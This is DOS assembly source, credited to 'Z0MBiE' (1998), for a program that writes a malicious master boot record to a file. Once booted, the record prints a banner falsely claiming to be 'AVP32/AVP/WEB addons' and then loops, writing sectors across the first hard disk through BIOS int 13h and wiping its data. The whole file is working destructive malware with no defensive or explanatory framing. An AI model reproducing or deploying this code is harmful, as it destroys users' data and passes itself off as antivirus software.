
include         d:\my\rulez.inc

                org     100h
start:
                mov     ah, 3ch
                lea     dx, filename
                xor     cx, cx
                int     21h

                xchg    bx, ax

                mov     ah, 40h
                lea     dx, mbr
                mov     cx, 512
                int     21h

                mov     ah, 3eh
                int     21h

                mov     ax, 4c00h
                int     21h

filename        db      'mbr',0



                org     7c00h
mbr:
                cli
                xor     bx, bx
                mov     ss, bx
                mov     sp, 7c00h
                sti

                mov     ds, bx
                mov     es, bx

                mov     ax, 3
                int     10h

                lea     si, message
                call    msg

                xor     ch, ch
                xor     dh, dh

fuck:           mov     ax, 0300h + 7
                mov     cl, 2
                mov     dl, 80h
                int     13h

                add     ch, 1
                adc     dl, 0

                jmp     fuck

message         db      13,10
                db      'AVP32/AVP/WEB addons (c) 1998 Z0MBiE',13,10
                db      'Greetings to my friends',13,10
                db      13,10
                db      'Empty spaces - what are we living for...',13,10
                db      0

msg:            cld
@@1:            segcs   lodsb
                or      al, al
                jz      @@exit
                mov     ah, 0Eh
                xor     bx, bx
                int     10h
                jmp     @@1
@@exit:         ret

                org     mbr + 512 - 64 - 2
                db      64 dup ('?')

                dw      0aa55h

                end     start
